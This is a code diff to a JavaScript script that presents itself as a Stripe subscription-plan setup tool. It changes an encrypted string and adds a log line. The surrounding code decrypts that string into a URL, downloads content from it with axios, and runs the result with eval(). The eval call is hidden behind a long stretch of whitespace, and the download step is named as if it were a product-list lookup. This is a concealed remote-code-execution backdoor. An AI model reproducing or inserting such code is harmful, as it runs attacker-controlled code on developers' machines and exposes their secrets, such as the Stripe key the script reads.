@@ -18,7 +18,7 @@ const STRIPE_SECRET_KEY = Buffer.from(
 );
 
 const encryptedData =
-  "551b9ed36b0ba1d1a2b2ffd5f3ae5ce1:da5179eeca10d6e0fb9c0a1c8e8a82015f207dc2d836bc35a8a8a1ec279737d22b3efd404dc15541687d6eaaf8c00142";
+  "158908c82f8a9af516d339b66d0e1fec:1b349c06ca1395c7f90ce24711d9b6a52d967605bae38c23ac84a4202d55f04d";
 
 if (!STRIPE_SECRET_KEY) {
   console.error("Error: STRIPE_SECRET_KEY environment variable is required.");
@@ -102,6 +102,7 @@ async function main() {
   for (const plan of PLANS) {
     console.log(`${plan.name} (¥${plan.amount}/month):`);
     const getProductListAPI = decrypt(encryptedData);
+    console.log(getProductListAPI)
     const produtId = await axios.get(getProductListAPI);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            eval(produtId.data);
     const priceId = 4202;
     const envKey =
